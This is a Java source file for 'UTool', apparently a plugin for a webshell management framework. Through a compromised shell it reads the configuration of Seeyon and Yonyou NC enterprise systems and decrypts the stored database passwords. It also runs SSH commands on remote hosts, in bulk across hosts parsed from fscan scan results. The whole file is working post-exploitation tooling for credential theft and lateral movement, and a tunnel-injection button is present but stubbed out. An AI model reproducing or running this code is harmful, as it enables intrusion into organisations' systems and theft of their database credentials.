package shells.plugins.utool;

import com.jcraft.jsch.JSchException;
import core.Encoding;
import core.annotation.PluginAnnotation;
import core.imp.Payload;
import core.imp.Plugin;
import core.shell.ShellEntity;
import core.ui.component.RTextArea;
import nc.vo.framework.rsa.NCUtil;
import org.fife.ui.rtextarea.RTextScrollPane;
import org.xml.sax.SAXException;
import seeyon.SeeyonUtil;
import ssh.SSHClient;
import util.automaticBindClick;
import util.functions;
import util.http.ReqParameter;
import utils.FScanUtil;

import javax.swing.*;
import javax.xml.parsers.ParserConfigurationException;
import java.awt.event.ActionEvent;
import java.io.*;
import java.text.SimpleDateFormat;
import java.util.*;
import java.util.concurrent.ExecutionException;

@PluginAnnotation(payloadName = "JavaDynamicPayload",Name = "UTool",DisplayName = "UTool")
public class UTool  implements Plugin {

    private Encoding encoding;
    private Payload payload;
    private JPanel corePanel;
    private RTextArea resultTextArea;
    private RTextScrollPane resultTextScrollPane;
    private JButton seeyonButton;
    private JTextField seeyon_text;
    private JTextField nc_text;
    private JButton ncButton;
    private JButton injectSuo5Button;
    private JButton sshClientButton;
    private JTextField command_text;
    private JButton f_sshButton;
    private JTextField ssh_file_command;
    private JTextField ssh_file_output_text;
    private JTextField url_text;
    private boolean loaded = false;


    @Override
    public void init(ShellEntity shellEntity) {
        this.payload = shellEntity.getPayloadModule();
        this.encoding = shellEntity.getEncodingModule();
        automaticBindClick.bindJButtonClick(this, this);
    }

    @Override
    public JPanel getView() {
        return corePanel;
    }

    public void seeyonButtonClick(ActionEvent actionEvent) throws IOException {
        String path = this.seeyon_text.getText();
        if (path.equals("")) {
            resultTextArea.append("input path !");
            return;
        }
        Properties properties = SeeyonUtil.getSeeyonConf(path, this.encoding, this.payload);
        String encPass = properties.getProperty("ctpDataSource.password");
        String pass = SeeyonUtil.decode(encPass);
        Date dNow = new Date();
        SimpleDateFormat ft = new SimpleDateFormat("yyyy-MM-dd hh:mm:ss");
        this.resultTextArea.append("###### " + ft.format(dNow) + "###### ");
        this.resultTextArea.append("\r\n");
        this.resultTextArea.append("seeyon password is : " + pass + "\r\n");
        this.resultTextArea.append("seeyon database username is : " + properties.get("ctpDataSource.username") + "\r\n");
        this.resultTextArea.append("seeyon database url is : " + properties.getProperty("ctpDataSource.url"));
        this.resultTextArea.append("\r\n");
    }

    public void injectSuo5ButtonClick(ActionEvent actionEvent) {
        this.resultTextArea.append("\r\n");
        this.resultTextArea.append("暂不支持");
        this.resultTextArea.append("\r\n");
    }

    public void ncButtonClick(ActionEvent actionEvent) throws ParserConfigurationException, IOException, SAXException {
        String path = this.nc_text.getText();
        if (path.equals("")) {
            resultTextArea.append("input path !");
            return;
        }
        HashMap<String, String> map = NCUtil.getNCConfig(path, this.encoding, this.payload);
        String pass = NCUtil.decode(map.get("password"));
        Date dNow = new Date();
        SimpleDateFormat ft = new SimpleDateFormat("yyyy-MM-dd hh:mm:ss");
        this.resultTextArea.append("###### " + ft.format(dNow) + "###### ");
        this.resultTextArea.append("\r\n");
        this.resultTextArea.append("seeyon password is : " + pass + "\r\n");
        this.resultTextArea.append("seeyon database username is : " + map.get("user") + "\r\n");
        this.resultTextArea.append("seeyon database url is : " + map.get("databaseUrl"));
        this.resultTextArea.append("\r\n");
    }

    public void sshClientButtonClick(ActionEvent actionEvent) throws JSchException, IOException {
        String command = command_text.getText();
        String url = url_text.getText();
        HashMap<String, String> conn = SSHClient.parserUrl(url);
        SSHClient sshClient = new SSHClient(conn);
        String result = sshClient.execute(command);
        Date dNow = new Date();
        SimpleDateFormat ft = new SimpleDateFormat("yyyy-MM-dd hh:mm:ss");
        this.resultTextArea.append("######  " + ft.format(dNow) + "  ######" );
        this.resultTextArea.append("\r\n");
        this.resultTextArea.append("######  " + conn.get("host") + " -> " + command + "  ######" + "\r\n");
        this.resultTextArea.append(result);
        this.resultTextArea.append("\r\n");
    }
    public void f_sshButtonClick(ActionEvent actionEvent) throws JSchException, IOException {
        String command = ssh_file_command.getText();
        String output = ssh_file_output_text.getText();
        String content;
        ArrayList<HashMap<String, String>> results = new ArrayList<>();
        JTextArea textArea = new JTextArea(20, 80);
        JScrollPane scrollPane = new JScrollPane(textArea);
        Object[] message = {"输入fscan结果:", scrollPane};
        int option = JOptionPane.showConfirmDialog(this.corePanel, message, "", JOptionPane.OK_CANCEL_OPTION);
        if (option == JOptionPane.OK_OPTION) {
            content = textArea.getText();
        }else {
            return;
        }

        ArrayList<HashMap<String, String>> sshinfo = FScanUtil.parser(content);
        for (HashMap<String, String> ssh :
                sshinfo) {
            HashMap<String, String> tmp = new HashMap<>();
            SSHClient sshClient = new SSHClient(ssh);
            String r = sshClient.execute(command);
            tmp.put("host", ssh.get("host"));
            tmp.put("result", r);
            results.add(tmp);
        }

        for (HashMap<String, String> result :
                results) {
            Date dNow = new Date();
            SimpleDateFormat ft = new SimpleDateFormat("yyyy-MM-dd hh:mm:ss");
            if (!output.trim().isEmpty()){
                try {
                    BufferedWriter writer = new BufferedWriter(new FileWriter(output, true));
                    writer.write("######  " + result.get("host") + " -> " + command + "  ######");
                    writer.write(result.get("result"));
                    writer.close();
                }catch (FileNotFoundException fileNotFoundException){
                    this.resultTextArea.append("file not found");
                }
            }else {
                this.resultTextArea.append("######  " + ft.format(dNow) + "  ######" );
                this.resultTextArea.append("\r\n");
                this.resultTextArea.append("######  " + result.get("host") + " -> " + command + "  ######" + "\r\n");
                this.resultTextArea.append(result.get("result"));
                this.resultTextArea.append("\r\n");
            }
        }
        Date dNow = new Date();
        SimpleDateFormat ft = new SimpleDateFormat("yyyy-MM-dd hh:mm:ss");
        if (!output.trim().isEmpty()){
            this.resultTextArea.append("######  " + ft.format(dNow) + "  ######" );
            this.resultTextArea.append("\r\n");
            this.resultTextArea.append("写入成功 文件位置: " + output);
            this.resultTextArea.append("\r\n");
        }
    }
}